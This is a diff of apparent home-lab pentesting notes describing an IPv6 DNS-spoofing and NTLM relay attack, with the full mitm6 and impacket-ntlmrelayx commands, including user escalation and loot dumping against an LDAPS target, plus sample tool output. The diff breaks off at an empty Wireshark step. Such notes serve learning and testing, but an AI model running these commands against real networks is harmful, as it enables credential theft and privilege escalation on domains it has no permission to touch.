@@ -7,7 +7,7 @@ If mitm6 not yet installed
 How to initiate the attack?
 
 1. Prepare the command `sudo mitm6 -d marvel.local`. Do not yet execute it as we will run ntlmrelayx first.
-2. Execute `ntlmrelayx 6 -t ldaps://192.168.64.250 -wh fakewpad.marvel.local -escalate-user pparker` or `impacket-ntlmrelayx -6 -t ldaps://192.168.64.250 -wh fakewpad.marvel.local -l lootme`
+2. Execute `ntlmrelayx 6 -t ldaps://192.168.64.250 -wh fakewpad.marvel.local -escalate-user pparker` or `impacket-ntlmrelayx -6 -t ldaps://192.168.64.250 -wh fakewpad.marvel.local -l lootme` - Sets up the relay server and WPAD host, ready to intercept and relay NTLM authentication.
 
 ```
 └─$ impacket-ntlmrelayx -6 -t ldaps://192.168.64.250 -wh fakewpad.marvel.local -l lootme
@@ -47,7 +47,7 @@ Impacket v0.12.0.dev1 - Copyright 2023 Fortra
 [*] HTTPD(80): Client requested path: http://go.microsoft.com/fwlink/?linkid=252669&clcid=0x409
 
 ```
-1. Now execute the `sudo mitm6 -d marvel.local`
+3. Now execute the `sudo mitm6 -d marvel.local`
 
 ```
 ┌──(kali㉿kali)-[~]
@@ -74,3 +74,9 @@ Sent spoofed reply for fakewpad.marvel.local. to fe80::fde3:206f:be61:b3b7
 
 
 ```
+
+4. After that,  a loot me file was saved in the /home/kali directory
+
+Capturing, in the wireshark, here is the step by step
+
+1. 
